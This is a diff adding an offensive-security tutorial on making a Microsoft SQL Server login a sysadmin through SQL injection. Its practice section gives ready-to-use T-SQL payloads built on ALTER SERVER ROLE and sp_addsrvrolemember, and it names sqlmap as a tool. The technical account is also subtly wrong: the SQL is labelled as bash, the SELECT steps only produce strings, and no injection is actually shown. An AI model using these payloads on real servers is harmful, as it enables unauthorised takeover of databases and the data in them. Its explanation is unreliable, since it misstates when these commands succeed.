@@ -1,0 +1,78 @@
+---
+title: 'MSSQL Make User DBA: Elevate Database Privileges'
+description: Learn to escalate privileges to DBA using SQL injection techniques on
+  MSSQL, gaining full server control.
+keywords:
+- MSSQL
+- DBA
+- Privilege Escalation
+- SQL Injection
+- sysadmin role
+- sp_addsrvrolemember
+- ALTER SERVER ROLE
+---
+
+# MSSQL Make User DBA
+
+## Context
+
+In this article, you will learn how to escalate privileges to Database Administrator (DBA) on a Microsoft SQL Server by exploiting SQL injection vulnerabilities. This technique is crucial for offensive security professionals looking to gain full control over databases. The guide assumes you have intermediate knowledge of database privileges, role management, and SQL Server security concepts.
+
+## Theory
+
+### Role Assignment in MSSQL
+
+Roles in Microsoft SQL Server define a collection of permissions that can be granted to users. A key role is the Database Administrator (DBA), which has unrestricted access to manage the database server. Understanding how roles are assigned and managed is pivotal when attempting privilege escalation.
+
+### ALTER SERVER ROLE Command
+
+The `ALTER SERVER ROLE` command is used to modify server-level roles in MSSQL. Attackers can inject SQL to alter server roles, escalating their privileges by adding users to powerful roles such as `sysadmin`.
+
+### sp_addsrvrolemember Procedure
+
+The `sp_addsrvrolemember` stored procedure allows an administrator to add a login to a fixed server role. By leveraging SQL injection, attackers can execute this procedure to include their user accounts in privileged roles, facilitating a comprehensive compromise of the database.
+
+### Security Implications of sysadmin Role
+
+The `sysadmin` role in SQL Server grants unrestricted access to all database server resources. This level of access implies complete control over the server, so it is imperative that only trusted users maintain this level of privilege. Unauthorized escalation to sysadmin can result in data breaches and system compromise.
+
+## Practice
+
+### Privilege Escalation via ALTER SERVER ROLE
+
+By injecting malicious SQL payloads, it is possible to escalate user privileges to `sysadmin` using the `ALTER SERVER ROLE` command.
+
+- Begin by crafting a SQL injection payload to alter the server role:
+    ```bash
+    SELECT 'ALTER SERVER ROLE sysadmin ADD MEMBER <username>';
+    ```
+    Replace `<username>` with the target username you wish to escalate.
+
+- Execute the crafted payload to escalate privileges:
+    ```bash
+    EXEC sp_executesql N'ALTER SERVER ROLE sysadmin ADD MEMBER <username>';
+    ```
+    If successful, the user will be given sysadmin privileges.
+
+### Privilege Escalation via sp_addsrvrolemember
+
+Escalating privileges through the `sp_addsrvrolemember` stored procedure is another effective technique. This approach involves adding a user to the `sysadmin` role.
+
+- Create the SQL injection payload to add a user to `sysadmin`:
+    ```bash
+    SELECT 'EXEC sp_addsrvrolemember ''<username>'', ''sysadmin''';
+    ```
+    Replace `<username>` with the specific user you want to promote.
+
+- Execute the injection payload:
+    ```bash
+    EXEC sp_executesql N'EXEC sp_addsrvrolemember ''<username>'', ''sysadmin''';
+    ```
+    Upon execution, the target user is added to the `sysadmin` role, granting them full control.
+
+## Tools
+
+- **sqlmap**
+- **MSSQL Management Studio**
+
+By following these techniques, an attacker can escalate their privileges to sysadmin on a vulnerable Microsoft SQL Server, gaining significant control over the database environment. Always ensure you conduct these activities in a controlled and authorized setting.
